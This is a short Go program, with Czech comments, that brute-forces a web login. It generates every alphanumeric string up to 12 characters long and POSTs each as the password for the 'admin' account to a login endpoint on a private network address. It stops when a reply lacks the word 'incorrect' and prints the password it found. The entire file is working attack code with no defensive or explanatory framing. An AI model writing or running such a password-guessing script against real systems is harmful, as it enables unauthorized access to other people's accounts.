package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

func nextLetter(login []rune, dict []rune, place []int, channel chan []rune) {

	for {
		x := 1
		for index := 0; index < x; index++ {

			//zarazi pripadny presah indexu
			if x == 12 {
				break
			} else if login[index] == dict[61] {
				login[index] = dict[0]
				place[index] = 0
				x++

			} else {
				login[index] = dict[place[index]+1]
				place[index]++
			}
		}
		channel <- login
	}
}

func setup(login []rune, dict []rune, place []int) {

	for i := 0; i < 12; i++ {
		place[i] = -1
		login[i] = 0
	}
	//nastavi prvni hodnoty
	place[0] = 0
	login[0] = dict[0]
}

func communication(channel chan []rune) {

	for {
		login := <-channel

		str := makeCleanString(login)

		//fmt.Println(str)
		response, err := http.PostForm("http://192.168.0.52:9000/login", url.Values{"login": {"admin"}, "password": {str}})

		if err != nil {
			fmt.Println("neco se stalo: ", err.Error())
		}

		bytes, _ := ioutil.ReadAll(response.Body)
		response.Body.Close()

		if !strings.Contains(string(bytes), "incorrect") {
			fmt.Println(string(bytes), string(login))
			break
		}
	}
}

func makeCleanString(dirtyRunes []rune) string {

	str := ""
	for _, v := range dirtyRunes {
		if v == 0 {
			continue
		}
		str += string(v)
	}
	return str
}

func main() {
	dict := []rune{
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
		'1', '2', '3', '4', '5', '6', '7', '8', '9', '0'}

	login := make([]rune, 12, 12)
	place := make([]int, 12, 12)
	channel := make(chan []rune)

	setup(login, dict, place)

	go nextLetter(login, dict, place, channel)
	communication(channel)
}
